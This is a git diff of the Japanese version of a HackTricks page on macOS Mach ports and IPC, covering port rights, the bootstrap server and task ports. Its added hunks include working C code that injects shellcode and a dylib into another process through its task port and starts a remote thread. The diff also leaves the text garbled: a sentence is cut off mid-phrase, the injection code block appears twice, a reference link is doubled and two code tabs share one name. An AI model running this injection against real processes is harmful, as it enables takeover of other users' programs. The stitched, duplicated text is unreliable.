@@ -5,73 +5,86 @@
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-## ポートを介したMachメッセージング
+## Machメッセージングを介したポート間の通信
 
-Machは、リソースの共有において**タスク**を最小単位として使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドは、POSIXプロセスとスレッドに1：1でマッピング**されます。
+### 基本情報
 
-タスク間の通信は、Machインタープロセス通信（IPC）を使用して行われ、片方向の通信チャネルを利用します。**メッセージはポート間で転送**され、カーネルによって管理される**メッセージキュー**のような役割を果たします。
+Machは、リソースの共有において**タスク**を**最小単位**として使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドは、POSIXプロセスとスレッドに1：1でマッピング**されます。
 
-各プロセスには**IPCテーブル**があり、そこにはプロセスの**Machポート**が格納されています。Machポートの名前は実際には数値（カーネルオブジェクトへのポインタ）です。
+タスク間の通信は、Machインタープロセス通信（IPC）を介して行われ、片方向の通信チャネルを利用します。**メッセージはポート間で転送**され、カーネルによって管理される**メッセージキュー**のような役割を果たします。
 
-プロセスはまた、**ポート名とその権限**を**別のタスクに送信**することもでき、カーネルはこれを**他のタスクのIPCテーブルにエントリとして登録**します。
+各プロセスには**IPCテーブル**があり、そこには**プロセスのMachポート**が格納されています。Machポートの名前は実際には数値（カーネルオブジェクトへのポインタ）です。
 
-この通信には、タスクが実行できる操作を定義する**ポート権限**が重要です。可能な**ポート権限**は次のとおりです。
+プロセスはまた、**ポート名とその権限を別のタスクに送信**することもでき、カーネルはこれを他のタスクの**IPCテーブルにエントリとして登録**します。
 
-* **受信権**：ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（複数プロデューサ、単一コンシューマ）キューであり、システム全体で**ポートごとに受信権は1つだけ**存在できます（複数のプロセスが1つのパイプの読み取りエンドに対するファイルディスクリプタを保持できるパイプとは異なります）。
-* **受信権を持つタスク**はメッセージを受信し、メッセージを送信するための**送信権を作成**することができます。元々は**自分自身のタスクが自分自身のポートに対して受信権を持っていました**。
-* **送信権**：ポートにメッセージを送信することを許可します。
-* 送信権は**クローン**することができ、送信権を所有するタスクは権限を**第三のタスクに付与**することができます。
-* **一度だけ送信権**：ポートに1つのメッセージを送信し、その後消えます。
-* **ポートセット権**：単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、それに含まれるポートからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートで同時にリッスンするために使用できます。
+### ポート権限
+
+通信には、タスクが実行できる操作を定義する**ポート権限**が重要です。可能な**ポート権限**は次のとおりです。
+
+* **受信権限**：ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（複数プロデューサ、単一コンシューマ）キューであるため、システム全体で**ポートごとに受信権限は1つだけ**存在できます（複数のプロセスが1つのパイプの読み取りエンドに対するファイルディスクリプタを保持できるパイプとは異なります）。
+* **受信権限を持つタスク**はメッセージを受信し、メッセージを送信するための**送信権限を作成**することができます。元々は**自分自身のタスクが自分自身のポートに対して受信権限を持っていました**。
+* **送信権限**：ポートにメッセージを送信することを許可します。
+* 送信権限は**クローン**することができ、送信権限を所有するタスクは権限を**第三のタスクに付与**することができます。
+* **一度だけ送信権限**：ポートに1つのメッセージを送信し、その後消えます。
+* **ポートセット権限**：単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、それに含まれるポートからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートで同時にリッスンするために使用できます。
 * **デッドネーム**：実際のポート権限ではなく、単なるプレースホルダです。ポートが破棄されると、ポートへのすべての既存のポート権限がデッドネームに変わります。
 
-**タスクはSEND権を他のタスクに転送**することができ、それによりメッセージを送信できるようになります。**SEND権はクローン**することもでき、タスクはSEND権を複製して**第三のタスクに付与**することができます。これにより、中間プロセスである**ブートストラップサーバ**との効果的な通信が可能になります。
+**タスクはSEND権限を他のタスクに転送**することができ、それによりメッセージを送信できるようになります。**SEND権限はクローン**することもできるため、タスクは権限を複製して**第三のタスクに付与**することができます。これにより、中間プロセスである**ブートストラップサーバ**との間で効果的な通信が可能になります。
+
+### 通信の確立
 
 #### 手順：
 
-前述のように、通信チャネルを確立するためには、**ブートストラップサーバ**（macでは**launchd**）が関与します。
+通信チャネルを確立するためには、**ブートストラップサーバ**（macでは**launchd**）が関与します。
 
-1. タスク**A**は**新しいポート**を初期化し、プロセス内で**受信権**を取得します。
-2. 受信権の所有者であるタスク**A**は、ポートのための**送信権を生成**します。
-3. タスク**A**は、**ブートストラップサーバ**との**接続**を確立し、**ポートのサービス名**と**送信権**をブートストラップ登録という手順を通じて提供します。
-4. タスク**B**は、サービス名のために**ブートストラップサーバ**とやり取りし、ブートストラップの**サービス名の検索**を実行します。成功した場合、**サーバはタスクAから受け取った送信権を複製**し、**タスクBに送信**します。
-5. 送信権を取得したタスク**B**は、メッセージを**作成**して**タスクAに送信**することができます。
+1. タスク**A**は**新しいポート**を初期化し、プロセス内で**受信権限**を取得します。
+2. 受信権限を持つタスク**A**は、ポートの**送信権限を生成**します。
+3. タスク**A**は、**ブートストラップサーバ**との**接続**を確立し、**ポートのサービス名**と**送信権限**をブートストラップ登録という手順を通じて提供します。
+4. タスク**B**は、サービス名のブートストラップ**ルックアップ**を実行するために**ブートストラップサーバ**とやり取りします。成功した場合、サーバはタスクAから受け取った**送信権限を複製**し、**タスクBに送信**します。
+5. 送信権限を取得したタスク**B**は、メッセージを**作成**し、それを**タスクAに送信**します。
+6. 双方向通信の場合、通常はタスク**B**が**受信権限**と**送信権限**を持つ新しいポートを生成し、**送信権限をタスクAに渡す**ことで、タスクAからタスクBにメッセージを送信できるようにします（双方向通信）。
 
-ブートストラップサーバは、タスクが主張するサービス名を**認証することはできません**。これは、タスクが潜在的に**システムタスクをなりすます**ことができる可能性があることを意味します。たとえば、**認証サービス名を偽って要求を承認**することができます。
+ブートストラップサーバは、タスクが
+### Machメッセージ
 
-その後、Appleはシステム提供のサービスの名前を、**SIPで保護された**ディレクトリにあるセキュアな設定ファイルに格納しています：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。ブートストラップサーバは、これらのサービス名ごとに**受信権を作成**し、保持します。
+Machメッセージは、**`mach_msg`関数**を使用して送信または受信されます（これは基本的にシスコールです）。送信時には、この呼び出しの最初の引数は**メッセージ**でなければなりません。メッセージは、**`mach_msg_header_t`**で始まり、実際のペイロードが続きます。
+```c
+typedef struct {
+mach_msg_bits_t               msgh_bits;
+mach_msg_size_t               msgh_size;
+mach_port_t                   msgh_remote_port;
+mach_port_t                   msgh_local_port;
+mach_port_name_t              msgh_voucher_port;
+mach_msg_id_t                 msgh_id;
+} mach_msg_header_t;
+```
+**受信者**は、machポートでメッセージを**受信**できるプロセスと言われ、**送信者**は_**送信**_または_**送信一度**_**権限**を持っています。名前の通り、送信一度は1回のメッセージの送信のみに使用され、その後は無効になります。
 
-これらの事前定義されたサービスに対しては、**検索プロセスが若干異なり
+簡単な**双方向通信**を実現するために、プロセスは**machメッセージヘッダ**の中にある_応答ポート_（**`msgh_local_port`**）と呼ばれるmachポートを指定することができます。メッセージの**受信者**は、このメッセージに対して**応答を送信**することができます。**`msgh_bits`**のビットフラグを使用して、このポートに**送信一度**権限が派生して転送されることを示すことができます（`MACH_MSG_TYPE_MAKE_SEND_ONCE`）。
+
+{% hint style="success" %}
+このような双方向通信は、応答を期待するXPCメッセージ（`xpc_connection_send_message_with_reply`および`xpc_connection_send_message_with_reply_sync`）で使用されます。ただし、通常は前述のように異なるポートが作成され、双方向通信が作成されます。
+{% endhint %}
+
+メッセージヘッダの他のフィールドは次のとおりです：
+
+* `msgh_size`：パケット全体のサイズ。
+* `msgh_remote_port`：このメッセージが送信されるポート。
+* `msgh_voucher_port`：[machバウチャー](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
+* `msgh_id`：受信者によって解釈されるこのメッセージのID。
+
+{% hint style="danger" %}
+**machメッセージはmachポートを介して送信**されることに注意してください。これは、machカーネルに組み込まれた**単一の受信者**、**複数の送信者**の通信チャネルです。**複数のプロセス**がmachポートにメッセージを**送信**できますが、いつでも**単一のプロセスしか読み取ることができません**。
+{% endhint %}
+
 ### ポートの列挙
-
-To enumerate ports on a macOS system, you can use various tools and techniques. Here are a few methods you can try:
-
-1. **Netstat**: Use the `netstat` command to display active network connections and listening ports. Run the following command in the terminal:
-   ```
-   netstat -an | grep LISTEN
-   ```
-   This will show a list of open ports and the associated processes.
-
-2. **Nmap**: Nmap is a powerful network scanning tool that can be used to enumerate ports on remote systems. Install Nmap on your macOS system and run the following command:
-   ```
-   nmap -p- <target_ip>
-   ```
-   Replace `<target_ip>` with the IP address of the system you want to scan. This command will scan all ports on the target system and display the open ones.
-
-3. **Lsof**: The `lsof` command can be used to list open files and the processes that have them open. Run the following command in the terminal:
-   ```
-   sudo lsof -i -P | grep LISTEN
-   ```
-   This will show a list of processes listening on open ports.
-
-Remember to use these techniques responsibly and only on systems you have permission to scan.
 ```bash
 lsmp -p <pid>
 ```
@@ -79,7 +92,7 @@ lsmp -p <pid>
 
 ### コードの例
 
-**送信者**は、ポートを割り当て、名前 `org.darlinghq.example` のための**送信権**を作成し、それを**ブートストラップサーバ**に送信します。一方、受信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**します。
+**送信者**はポートを割り当て、名前`org.darlinghq.example`の**送信権**を作成し、それを**ブートストラップサーバ**に送信します。一方、受信者はその名前の**送信権**を要求し、それを使用してメッセージを送信します。
 
 {% tabs %}
 {% tab title="receiver.c" %}
@@ -191,7 +204,7 @@ int main(int argc, char** argv) {
 ```
 {% endtab %}
 
-{% tab title="server.c" %}
+{% tab title="receiver.c" %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -248,12 +261,12 @@ printf("Sent a message\n");
 
 ### 特権ポート
 
-* **ホストポート**: このポートに対して**Send**権限を持つプロセスは、**システムに関する情報**（例：`host_processor_info`）を取得することができます。
-* **ホスト特権ポート**: このポートに対して**Send**権限を持つプロセスは、カーネル拡張をロードするなどの**特権アクション**を実行することができます。この権限を取得するには、**プロセスはルート権限**を持つ必要があります。
+* **ホストポート**: プロセスがこのポートに対して**送信権限**を持っている場合、システムに関する**情報**（例：`host_processor_info`）を取得できます。
+* **ホスト特権ポート**: このポートに対して**送信権限**を持つプロセスは、カーネル拡張をロードするなどの**特権アクション**を実行できます。この権限を取得するには、**プロセスはルート権限**を持つ必要があります。
 * さらに、**`kext_request`** APIを呼び出すためには、Appleのバイナリにのみ与えられる**`com.apple.private.kext*`**という他の権限が必要です。
 * **タスク名ポート**: _タスクポート_の非特権バージョンです。タスクを参照することはできますが、制御することはできません。これを通じて利用できる唯一のものは`task_info()`です。
-* **タスクポート**（またはカーネルポート）**:** このポートに対してSend権限を持つと、タスクを制御することができます（メモリの読み書き、スレッドの作成など）。
-* 呼び出し元タスクのこのポートの**名前を取得**するには、`mach_task_self()`を呼び出します。このポートは**`exec()`を跨いでのみ継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリの`exec()`後にもタスクは新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行う際に["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
+* **タスクポート**（またはカーネルポート）**: このポートに対する送信権限を持つと、タスクを制御することができます（メモリの読み書き、スレッドの作成など）。
+* 呼び出し元タスクのこのポートの**名前を取得**するには、`mach_task_self()`を呼び出します。このポートは**`exec()`を跨いでのみ継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別な場合として、suidバイナリの`exec()`後にもタスクは新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行う際に["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
 * これらはポートへのアクセス制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
 * アプリに**`com.apple.security.get-task-allow`権限**がある場合、**同じユーザーのプロセスはタスクポートにアクセス**できます（デバッグのためにXcodeによって一般的に追加されます）。**公開リリース**では、**公証**プロセスはこれを許可しません。
 * **`com.apple.system-task-ports`権限**を持つアプリは、カーネルを除く**任意の**プロセスのタスクポートを取得できます。以前のバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
@@ -360,9 +373,9 @@ int main(int argc, const char * argv[]) {
 ```
 {% endtab %}
 {% endtabs %}
-{% enddetails %}
+</details>
 
-**コンパイル**する前のプログラムに、同じユーザーでコードをインジェクトできるようにするための**権限**を追加します（そうでない場合は**sudo**を使用する必要があります）。
+Compile the previous program and add the entitlements to be able to inject code with the same user (if not you will need to use sudo).
 
 <details>
 
@@ -751,21 +764,127 @@ memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
 printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
 }
 ```c
-if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
+if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
 {
-    memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
-    printf("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
+printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
 }
 
 if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
 {
-    printf("DLOpen @%llx\n", addrOfDlopen);
-    memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+printf ("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
 }
 
 if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
 {
-    strcpy(possiblePatchLocation, lib);
+strcpy(possiblePatchLocation, lib );
+}
+}
+
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
+
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
+
+
+// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
+
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
+
+
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
+
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
+
+const char* p = (const char*) remoteCode64;
+
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
+}
+
+
+
+int main(int argc, const char * argv[])
+{
+if (argc < 3)
+{
+fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
+fprintf (stderr, "   _action_: path to a dylib on disk\n");
+exit(0);
+}
+
+pid_t pid = atoi(argv[1]);
+const char *action = argv[2];
+struct stat buf;
+
+int rc = stat (action, &buf);
+if (rc == 0) inject(pid,action);
+else
+{
+fprintf(stderr,"Dylib not found\n");
+}
+
+}
+```
+
+```c
+if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
+printf("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+}
+
+if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+{
+printf("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+}
+
+if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+{
+strcpy(possiblePatchLocation, lib);
 }
 }
 
@@ -788,7 +907,7 @@ kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EX
 
 if (kr != KERN_SUCCESS)
 {
-fprintf(stderr, "リモートスレッドのコードのメモリアクセス権を設定できませんでした：エラー %s\n", mach_error_string(kr));
+fprintf(stderr, "リモートスレッドのコードのメモリアクセス権を設定できません：エラー %s\n", mach_error_string(kr));
 return (-4);
 }
 
@@ -797,31 +916,31 @@ kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_P
 
 if (kr != KERN_SUCCESS)
 {
-fprintf(stderr, "リモートスレッドのスタックのメモリアクセス権を設定できませんでした：エラー %s\n", mach_error_string(kr));
+fprintf(stderr, "リモートスレッドのスタックのメモリアクセス権を設定できません：エラー %s\n", mach_error_string(kr));
 return (-4);
 }
 
 
-// シェルコードを実行するためのスレッドを作成する
+// シェルコードを実行するスレッドを作成する
 struct arm_unified_thread_state remoteThreadState64;
-thread_act_t remoteThread;
+thread_act_t         remoteThread;
 
 memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
 
 remoteStack64 += (STACK_SIZE / 2); // これが実際のスタックです
 //remoteStack64 -= 8;  // 16のアライメントが必要です
 
-const char* p = (const char*)remoteCode64;
+const char* p = (const char*) remoteCode64;
 
 remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
 remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-remoteThreadState64.ts_64.__pc = (u_int64_t)remoteCode64;
-remoteThreadState64.ts_64.__sp = (u_int64_t)remoteStack64;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
 printf("リモートスタック64  0x%llx、リモートコードは %p\n", remoteStack64, p);
 
 kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-(thread_state_t)&remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
 
 if (kr != KERN_SUCCESS) {
 fprintf(stderr, "リモートスレッドの作成に失敗しました：エラー %s", mach_error_string(kr));
@@ -833,7 +952,7 @@ return (0);
 
 
 
-int main(int argc, const char* argv[])
+int main(int argc, const char * argv[])
 {
 if (argc < 3)
 {
@@ -843,15 +962,14 @@ exit(0);
 }
 
 pid_t pid = atoi(argv[1]);
-const char* action = argv[2];
+const char *action = argv[2];
 struct stat buf;
 
 int rc = stat(action, &buf);
-if (rc == 0)
-    inject(pid, action);
+if (rc == 0) inject(pid, action);
 else
 {
-    fprintf(stderr, "Dylibが見つかりません\n");
+fprintf(stderr, "Dylibが見つかりません\n");
 }
 
 }
@@ -883,7 +1001,7 @@ XPC（XNUとは、macOSで使用されるカーネル）インタープロセス
 
 ## MIG - Mach Interface Generator
 
-MIGは、Mach IPCコードの作成プロセスを簡素化するために作成されました。基本的には、サーバーとクライアントが指定された定義と通信するために必要なコードを生成します。生成されたコードは見た目が悪くても、開発者はそれをインポートするだけで、以前よりもはるかにシンプルなコードになります。
+MIGは、Mach IPCコードの作成プロセスを簡素化するために作成されました。基本的には、サーバーとクライアントが指定された定義と通信するために必要なコードを生成します。生成されたコードは見た目が悪いかもしれませんが、開発者はそれをインポートするだけで、以前よりもはるかにシンプルなコードになります。
 
 詳細については、次を参照してください：
 
@@ -896,15 +1014,17 @@ MIGは、Mach IPCコードの作成プロセスを簡素化するために作成
 * [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
 * [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
 * [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
+* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
-* [**公式のPEASS＆HackTricksのスウェット**](https://peass.creator-spring.com)を手に入れましょう
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。
+* **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)をご覧ください。当社の独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
 
 </details>
